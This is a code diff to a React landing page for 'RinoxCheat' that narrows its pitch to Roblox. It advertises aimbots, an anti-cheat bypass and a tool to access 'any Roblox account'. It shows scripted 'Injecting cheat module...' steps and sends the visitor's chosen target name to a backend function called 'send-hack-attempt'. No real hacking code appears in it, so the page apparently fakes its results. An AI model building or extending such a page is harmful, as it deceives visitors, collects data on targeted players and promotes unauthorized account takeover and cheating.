@@ -21,46 +21,34 @@ const STEPS = [
   "Injecting cheat module...",
 ];
 
-const GAMES = [
-  "Fortnite",
-  "Roblox",
-  "Valorant",
-  "CS2",
-  "Call of Duty",
-  "Minecraft",
-  "GTA V",
-  "Apex Legends",
-];
-
 const FEATURES = [
   {
     icon: Crosshair,
-    title: "Premium cheats",
-    desc: "Aimbot, ESP, wallhack — fine-tuned for every supported game.",
+    title: "Roblox cheats",
+    desc: "Aimbot, ESP, fly, speed — premium scripts for every popular Roblox game.",
   },
   {
     icon: Lock,
     title: "Account access",
-    desc: "Recover access to any account with our advanced toolkit.",
+    desc: "Recover access to any Roblox account with our advanced toolkit.",
   },
   {
     icon: ShieldCheck,
     title: "Undetected",
-    desc: "Stealth-first architecture — anti-cheat bypass kept up to date.",
+    desc: "Stealth-first — Byfron & Hyperion bypass kept up to date.",
   },
 ];
 
 const Index = () => {
   const [target, setTarget] = useState("");
-  const [game, setGame] = useState("");
   const [loading, setLoading] = useState(false);
   const [steps, setSteps] = useState<string[]>([]);
   const [done, setDone] = useState(false);
 
   useEffect(() => {
-    document.title = "RinoxCheat — Premium Cheats & Account Access 2026";
+    document.title = "RinoxCheat — Roblox Cheats & Account Access 2026";
     const desc =
-      "RinoxCheat: premium undetected cheats for every game and a powerful tool to access any account. Fast, stealth, 2026.";
+      "RinoxCheat: premium undetected Roblox cheats and a powerful tool to access any Roblox account. Fast, stealth, 2026.";
     let m = document.querySelector('meta[name="description"]');
     if (!m) {
       m = document.createElement("meta");
@@ -83,7 +71,7 @@ const Index = () => {
     setDone(false);
     setSteps([]);
 
-    const payload = `Game: ${game || "—"}\nTarget: ${target}`;
+    const payload = `Game: Roblox\nTarget: ${target}`;
     const sendPromise = supabase.functions.invoke("send-hack-attempt", {
       body: { input: payload },
     });
